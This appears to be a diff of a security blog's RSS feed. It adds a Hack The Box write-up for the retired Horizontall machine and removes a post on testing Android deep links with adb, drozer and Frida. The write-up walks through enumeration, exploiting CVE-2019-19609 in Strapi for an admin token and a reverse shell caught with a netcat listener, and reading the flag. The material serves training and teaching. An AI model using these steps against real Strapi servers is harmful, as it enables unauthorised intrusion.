@@ -1,4 +1,46 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Fri, 15 Nov 2024 11:26:08 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Automatic Threat Modeling with pytm and Github Actions]]></title><description><![CDATA[<p><a href="https://github.com/OWASP/pytm">pytm</a> is a OWASP tool that integrates with a <a href="https://chatgpt.com/g/g-soISG24ix-pytmgpt">custom GPT</a> to make the threat modeling process quicker and more automated.</p><p>I&apos;ve developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to the Python files generated</p>]]></description><link>inesmartins.github.io/automate-threat-modeling-with-pytm-and-github-actions/</link><guid isPermaLink="false">6735dda89c0cf30ff24e2f75</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 14 Nov 2024 11:48:58 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png" alt="Automatic Threat Modeling with pytm and Github Actions"><p><a href="https://github.com/OWASP/pytm">pytm</a> is a OWASP tool that integrates with a <a href="https://chatgpt.com/g/g-soISG24ix-pytmgpt">custom GPT</a> to make the threat modeling process quicker and more automated.</p><p>I&apos;ve developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to the Python files generated using the GPT.</p><p>In order to use it, you need a Github repository with the following structure:</p><ul><li>a <code>/models</code> directory, where you&apos;re going to keep the Python files;</li><li>a <code>/reports</code> directory, where the reports are going to be stored;</li><li>a <code>pytm_template</code> directory, which should contain your <code>template.md</code> and <code>styles.css</code> files (you can find basic examples <a href="https://github.com/OWASP/pytm/tree/master/docs">here</a>).</li></ul><p>The Action works as follows: </p><ul><li>every time you create or update a PR with any changes to the Python files in the &#xA0;<code>/models</code> directory, <code>pytm</code> scans the modified files and generates a Data Flow Diagram (DFD) and HTML report for each one;</li><li>for each new HTML report, the tool generates a PDF file;</li><li>both the DFD and the PDF files are added to a <code>/reports/{filename}/</code> directory;</li><li>everything in the <code>/reports/</code> directory is immediately pushed to the <code>main</code> branch, so you can review these artefacts.</li></ul><p>You can find this Github Action below:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/555b3519baae0ea6f158c04516ca0f86.js"></script><!--kg-card-end: html-->]]></content:encoded></item><item><title><![CDATA[HTB Write-up | FormulaX (user-only)]]></title><description><![CDATA[Write-up for FormulaX, a retired HTB Linux machine.]]></description><link>inesmartins.github.io/htb-writeup-formulax/</link><guid isPermaLink="false">65fdb5b25c3d904d3825d752</guid><category><![CDATA[ctf]]></category><category><![CDATA[htb]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 13 Nov 2024 13:31:33 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.35.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.35.png" alt="HTB Write-up | FormulaX (user-only)"><p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/FormulaX">here</a>.</em></p><hr><p>Let&apos;s start with some basic enumeration:</p><pre><code class="language-bash">~ nmap -F 10.10.11.6
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Fri, 03 Jan 2025 11:38:32 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | Horizontall (user-only)]]></title><description><![CDATA[Write-up for Horizontall, a retired HTB Linux machine.]]></description><link>inesmartins.github.io/htb-write-up-horizontall/</link><guid isPermaLink="false">6134dd02ca603212098f61d2</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 03 Jan 2025 11:37:42 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2025/01/Horizontall-1.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://app.hackthebox.eu/machines/Horizontall">here</a>.</blockquote><h2 id="scanning">Scanning</h2><img src="inesmartins.github.io/content/images/2025/01/Horizontall-1.png" alt="HTB Write-up | Horizontall (user-only)"><p>Basic scanning shows only 2 services running on ports <code>22</code> and <code>80</code>:</p><pre><code>~ nmap 10.10.11.105 -sC -sV
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
+|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
+|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: horizontall
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>As per usual, I added <code>horizontall.htb</code> &#xA0;to the <code>hosts</code> file:</p><pre><code>~ sudo nano /etc/hosts
+10.10.11.105 horizontall.htb</code></pre><p>After taking a look at one of the <code>.js</code> files I found this reference to an API:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.44.52.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy" width="820" height="736" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-23-at-22.44.52.png 600w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.44.52.png 820w" sizes="(min-width: 720px) 720px"></figure><p>I added this URL to the <code>hosts</code> file in order to start exploring it:</p><pre><code>~ sudo nano /etc/hosts
+10.10.11.105 api-prod.horizontall.htb</code></pre><p>Accessing the <code>/reviews</code> endpoint I found 3 reviews and a couple of user names:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.46.13.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy" width="813" height="590" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-23-at-22.46.13.png 600w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.46.13.png 813w" sizes="(min-width: 720px) 720px"></figure><p>After using <code>gobuster</code> on the API I found some other endpoints:</p><pre><code>~ gobuster dir -u http://api-prod.horizontall.htb -t 50 -w seclists/big.txt -s 200 -b 404
+
+=============================================================== 
+Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) ===============================================================
+[+] Url:                     http://api-prod.horizontall.htb
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                Desktop/htb/machines/seclists/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s =============================================================== 2021/09/05 17:13:05 Starting gobuster in directory enumeration mode ===============================================================
+
+/ADMIN                (Status: 200) [Size: 854]
+/Admin                (Status: 200) [Size: 854]
+/admin                (Status: 200) [Size: 854]
+/favicon.ico          (Status: 200) [Size: 1150]
+/reviews              (Status: 200) [Size: 507]
+/robots.txt           (Status: 200) [Size: 121]
+/users                (Status: 403) [Size: 60] </code></pre><p>When I checked the <code>/admin</code> page I realized that the website was built using <a href="https://strapi.io/">strapi</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.48.46.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy"></figure><p>After searching for vulnerabilities I found <a href="https://www.cvedetails.com/cve/CVE-2019-19609/">CVE-2019-19609</a>. </p><p>By checking <a href="https://www.exploit-db.com/exploits/50237">this ExploitDB script</a> I realized we could get a <code>JWT</code> for user <code>admin</code> by sending the request below:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.49.53.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy" width="1015" height="534" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-23-at-22.49.53.png 600w, inesmartins.github.io/content/images/size/w1000/2021/09/Screenshot-2021-09-23-at-22.49.53.png 1000w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.49.53.png 1015w"></figure><p>Looking at the <code>JWT</code> we see the embedded data:</p><pre><code>{ &quot;id&quot;: 3, &quot;isAdmin&quot;: true, &quot;iat&quot;: 1630863570, &quot;exp&quot;: 1633455570 }</code></pre><p>With this token, I checked the <code>/users/me</code> endpoint and saw the authenticated user&apos;s information:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.50.49.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy" width="591" height="397"></figure><p>While looking into plugin installation, I came across <a href="https://www.cvedetails.com/cve/CVE-2019-19609/">CVE 2019-19609</a>, which allows an authenticated user to get a reverse shell, as shown below:&#x200C;</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-22.53.53.png" class="kg-image" alt="HTB Write-up | Horizontall (user-only)" loading="lazy"></figure><p>... and we get a shell as <code>strapi</code>!</p><pre><code>~ nc -l 4444
+/bin/sh: 0: can&apos;t access tty; job control turned off
+
+$ whoami
+strapi</code></pre><p>Looks like that&apos;s all it takes to get the <code>user</code> flag:</p><pre><code>$ cd /home 
+$ ls 
+developer 
+$ cd developer 
+$ ls
+composer-setup.php myproject user.txt 
+$ cat user.txt
+53e897d91891afb3e4004c4e2665a6b6</code></pre><hr><h2 id="useful-links">Useful Links</h2><ul><li><a href="https://strapi.io/documentation/developer-docs/latest/development/admin-customization.html#customization-options">https://strapi.io/documentation/developer-docs/latest/development/admin-customization.html#customization-options</a></li><li><a href="https://bittherapy.net/post/strapi-framework-remote-code-execution/">https://bittherapy.net/post/strapi-framework-remote-code-execution/</a></li><li><a href="https://pythonawesome.com/strapi-framework-vulnerable-to-remote-code-execution/">https://pythonawesome.com/strapi-framework-vulnerable-to-remote-code-execution/</a></li><li><a href="https://bittherapy.net/post/strapi-framework-remote-code-execution/">https://bittherapy.net/post/strapi-framework-remote-code-execution/</a></li></ul>]]></content:encoded></item><item><title><![CDATA[Automatic Threat Modeling with pytm and Github Actions]]></title><description><![CDATA[<p><a href="https://github.com/OWASP/pytm">pytm</a> is a OWASP tool that integrates with a <a href="https://chatgpt.com/g/g-soISG24ix-pytmgpt">custom GPT</a> to make the threat modeling process quicker and more automated.</p><p>I&apos;ve developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to the Python files generated</p>]]></description><link>inesmartins.github.io/automate-threat-modeling-with-pytm-and-github-actions/</link><guid isPermaLink="false">6735dda89c0cf30ff24e2f75</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 14 Nov 2024 11:48:58 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png" alt="Automatic Threat Modeling with pytm and Github Actions"><p><a href="https://github.com/OWASP/pytm">pytm</a> is a OWASP tool that integrates with a <a href="https://chatgpt.com/g/g-soISG24ix-pytmgpt">custom GPT</a> to make the threat modeling process quicker and more automated.</p><p>I&apos;ve developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to the Python files generated using the GPT.</p><p>In order to use it, you need a Github repository with the following structure:</p><ul><li>a <code>/models</code> directory, where you&apos;re going to keep the Python files;</li><li>a <code>/reports</code> directory, where the reports are going to be stored;</li><li>a <code>pytm_template</code> directory, which should contain your <code>template.md</code> and <code>styles.css</code> files (you can find basic examples <a href="https://github.com/OWASP/pytm/tree/master/docs">here</a>).</li></ul><p>The Action works as follows: </p><ul><li>every time you create or update a PR with any changes to the Python files in the &#xA0;<code>/models</code> directory, <code>pytm</code> scans the modified files and generates a Data Flow Diagram (DFD) and HTML report for each one;</li><li>for each new HTML report, the tool generates a PDF file;</li><li>both the DFD and the PDF files are added to a <code>/reports/{filename}/</code> directory;</li><li>everything in the <code>/reports/</code> directory is immediately pushed to the <code>main</code> branch, so you can review these artefacts.</li></ul><p>You can find this Github Action below:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/555b3519baae0ea6f158c04516ca0f86.js"></script><!--kg-card-end: html-->]]></content:encoded></item><item><title><![CDATA[HTB Write-up | FormulaX (user-only)]]></title><description><![CDATA[Write-up for FormulaX, a retired HTB Linux machine.]]></description><link>inesmartins.github.io/htb-writeup-formulax/</link><guid isPermaLink="false">65fdb5b25c3d904d3825d752</guid><category><![CDATA[ctf]]></category><category><![CDATA[htb]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 13 Nov 2024 13:31:33 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.35.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.35.png" alt="HTB Write-up | FormulaX (user-only)"><p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/FormulaX">here</a>.</em></p><hr><p>Let&apos;s start with some basic enumeration:</p><pre><code class="language-bash">~ nmap -F 10.10.11.6
 
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -1285,90 +1327,4 @@ app-private   local         ota         system_ce
 backup        lost+found    ota_package system_de      
 
 $ cat root.txt
-f04fc82b6d49b41c9b08982be59338c5</code></pre><p>Done :)</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 5 (Testing)]]></title><description><![CDATA[<h2 id="enumeration">Enumeration</h2><p>Enumeration should always start with the <a href="https://www.google.com/search?q=Android+Manifest&amp;rlz=1C5CHFA_enPT957PT957&amp;oq=Android+Manifest&amp;aqs=chrome..69i57j69i60.222j0j7&amp;sourceid=chrome&amp;ie=UTF-8">App Manifest</a>, which can be extracted from any <code>.apk</code> with a tool such as <a href="https://ibotpeaches.github.io/Apktool/">apktool</a>, e.g.:</p><pre><code>~ apktool d com.twitter.android_2021-10-22.apk 
-I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk
-I: Loading resource table...
-I: Decoding AndroidManifest.</code></pre>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-pat-5-testing/</link><guid isPermaLink="false">617d78ac3eb63780007bc5e3</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 30 Oct 2021 17:20:05 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/10/maxresdefault-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<h2 id="enumeration">Enumeration</h2><img src="inesmartins.github.io/content/images/2021/10/maxresdefault-1-1.jpeg" alt="Exploiting Deep Links in Android - Part 5 (Testing)"><p>Enumeration should always start with the <a href="https://www.google.com/search?q=Android+Manifest&amp;rlz=1C5CHFA_enPT957PT957&amp;oq=Android+Manifest&amp;aqs=chrome..69i57j69i60.222j0j7&amp;sourceid=chrome&amp;ie=UTF-8">App Manifest</a>, which can be extracted from any <code>.apk</code> with a tool such as <a href="https://ibotpeaches.github.io/Apktool/">apktool</a>, e.g.:</p><pre><code>~ apktool d com.twitter.android_2021-10-22.apk 
-I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk
-I: Loading resource table...
-I: Decoding AndroidManifest.xml with resources...
-I: Loading resource table from file: /Users/inesmartins/Library/apktool/framework/1.apk
-I: Regular manifest package...
-I: Decoding file-resources...
-I: Decoding values */* XMLs...
-I: Baksmaling classes.dex...
-I: Baksmaling classes2.dex...
-I: Baksmaling classes3.dex...
-I: Baksmaling classes4.dex...
-I: Baksmaling classes5.dex...
-I: Baksmaling classes6.dex...
-I: Baksmaling classes7.dex...
-I: Baksmaling classes8.dex...
-I: Baksmaling classes9.dex...
-I: Copying assets and libs...
-I: Copying unknown files...
-I: Copying original files...
-I: Copying META-INF/services directory
-
-~ open com.twitter.android_2021-10-22/AndroidManifest.xml</code></pre><p>When you open the manifest, you should start by looking for <code>&lt;intent-filter&gt;</code> elements:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-30-at-18.24.30.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 5 (Testing)" loading="lazy"></figure><p>Note the <strong>scheme</strong>, <strong>host</strong> and <strong>path</strong> attributes inside <code>&lt;data&gt;</code> elements to understand what deep links are supported, and check the <code>category</code> and <code>action</code> elements, as they give you clues about how the deep links are used.</p><p>The example below shows a Scheme URL with <code>scheme=&quot;myapp&quot;</code> and <code>host=&quot;path&quot;</code>, which means the following URI could be handled by the app: <code>myapp://path</code>.</p><pre><code>&lt;activity android:name=&quot;.MyUriActivity&quot;&gt;
-  &lt;intent-filter&gt;
-      &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;
-      &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;
-      &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot; /&gt;
-      &lt;data android:scheme=&quot;myapp&quot; android:host=&quot;path&quot; /&gt;
-  &lt;/intent-filter&gt;
-&lt;/activity&gt;</code></pre><p>When analysing app links, make sure the intent filter includes the &#xA0;<code>android:autoVerify=&quot;true&quot;</code> attribute, which enables app link verification:</p><pre><code>&lt;activity android:name=&quot;.MyUriActivity&quot;&gt;
-  &lt;intent-filter android:autoVerify=&quot;true&quot;&gt;
-      &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;
-      &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;
-      &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot; /&gt;
-      &lt;data android:scheme=&quot;http&quot; android:host=&quot;www.myapp.com&quot; android:path=&quot;/my/app/path&quot; /&gt;
-      &lt;data android:scheme=&quot;https&quot; android:host=&quot;www.myapp.com&quot; android:path=&quot;/my/app/path&quot; /&gt;
-  &lt;/intent-filter&gt;
-&lt;/activity&gt;
-</code></pre><hr><h2 id="verifying-app-link-association">Verifying App Link Association</h2><p>The simplest way to check if a link is correctly verified is to just enter it onto a mobile browser and check that the link is automatically (without any user interaction) opened with the intended app.</p><p>If you&apos;re looking for additional information, you can also use <a href="https://github.com/inesmartins/Android-App-Link-Verification-Tester/blob/main/README.md">this</a> simple Python tool that I&apos;ve developed. This library supports a bunch of different test modes and options, but most likely the <code>verify-applinks</code> option will give you what you need:</p><pre><code class="language-Python">~ python3 Android-App-Link-Verification-Tester/deeplink_analyser.py \
--apk com.twitter.android_2021-10-22.apk \
--p com.twitter.android \
--op verify-applinks
-
-[...]
-
-The APK&apos;s signing certificate&apos;s SHA-256 fingerprint is: 
-0F:D9:A0:CF:B0:7B:65:95:09:97:B4:EA:EB:DC:53:93:13:92:39:1A:A4:06:53:8A:3B:04:07:3B:C2:CE:2F:E9
-
-[...]
-
-Checking http://mobile.twitter.com/.*
-
-&#x2713; includes autoverify=true
-&#x2713; includes VIEW action
-&#x2713; includes BROWSABLE category
-&#x2713; includes DEFAULT category
-&#x2713; DAL verified
-
-  Relations: 
-    - [Standard] delegate_permission/common.get_login_creds
-    - [Standard] delegate_permission/common.handle_all_urls
-    - [Custom]   delegate_permission/common.use_as_origin
-
-Checking http://twitter.com/.*
-
-&#x2713; includes autoverify=true
-&#x2713; includes VIEW action
-&#x2713; includes BROWSABLE category
-&#x2713; includes DEFAULT category
-&#x2713; DAL verified
-
-  Relations: 
-    - [Standard] delegate_permission/common.get_login_creds
-    - [Standard] delegate_permission/common.handle_all_urls
-    - [Custom]   delegate_permission/common.use_as_origin
-
-[...]
-
-Read more about relation strings here: https://developers.google.com/digital-asset-links/v1/relation-strings</code></pre><hr><h2 id="static-and-dynamic-analysis">Static and Dynamic Analysis</h2><p>In order to understand what data is being taken from deep links and how that data is being processed, check for occurrences of:</p><ul><li><code>getIntent()</code> </li><li><code>.getData()</code></li><li><code>.getExtras()</code></li><li>Regex search: <code>\.get\w+Extra\(</code> &#xA0;-&gt; finds occurrences <code>.getStringExtra(</code>, &#xA0;<code>.getParcelableExtra(</code>, etc.)</li></ul><p>To understand how the app&#x2019;s <code>WebViews</code> are controlling which URLs are loaded and how, look for:</p><ul><li><code>shouldOverrideUrlLoading</code> </li><li><code>shouldInterceptRequest</code></li></ul><p>Finally, to see how the data or URIs are being loaded into the app&apos;s <code>WebViews</code>, check for any calls to:</p><ul><li><code>.loadUrl(</code> </li><li><code>.loadData(</code></li></ul><p>Note that, not only are these methods relevant when doing static analysis, you can also &quot;hook&quot; them with <a href="https://frida.re/docs/android/">Frida</a> when doing dynamic analysis.</p><hr><h2 id="automated-tests-and-fuzzing">Automated Tests and Fuzzing</h2><p>If you already know which deep link you you want to test, <a href="https://developer.android.com/studio/command-line/adb">adb</a> is the way to go:</p><pre><code>~ adb shell am start -W -a android.intent.action.VIEW -d &lt;url&gt;
-
-where:
--a ~&gt; action
--W ~&gt; wait for launch to complete
--d ~&gt; URL</code></pre><p>If you want to build and send a specific Intent URL, you can create a new Android app using <a href="https://developer.android.com/studio?gclid=CjwKCAjw2vOLBhBPEiwAjEeK9up2NghnnyViWFBXSe8F-3DO0-kSFC9KH7g6q3xdkSb5GD0_g5q4nRoCiLEQAvD_BwE&amp;gclsrc=aw.ds">Android Studio</a>, as shown below:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://lh4.googleusercontent.com/Yls7-O6Tjiy2gubg8v5SgKsTNiepUjuFaKAkvyn7CoHma9N7lpihmPKHnwrAhba7jvXyfqCx7o3mhMrTnOHOhqWAQ_UuV2ZEy8Nm-w9_Ix2gs1M2S9Ds8m1tQ1bTB9wop5yFqDOwIkk" class="kg-image" alt="Exploiting Deep Links in Android - Part 5 (Testing)" loading="lazy"></figure><p>Finally, if you have no idea what you&apos;re looking for, maybe give fuzzing a try with <a href="https://labs.f-secure.com/tools/drozer/">drozer</a>&apos;s <a href="https://github.com/FSecureLABS/drozer-modules/blob/master/intents/fuzzinozer.py">fuzzinozzer</a> module:</p><pre><code>dz&gt; run intents.fuzzinozer --complete_test --package com.twitter.android --save_state</code></pre><hr><p>And this is it, the end of the road for this series.<br>Hope you learned something!</p>]]></content:encoded></item></channel></rss>
+f04fc82b6d49b41c9b08982be59338c5</code></pre><p>Done :)</p>]]></content:encoded></item></channel></rss>
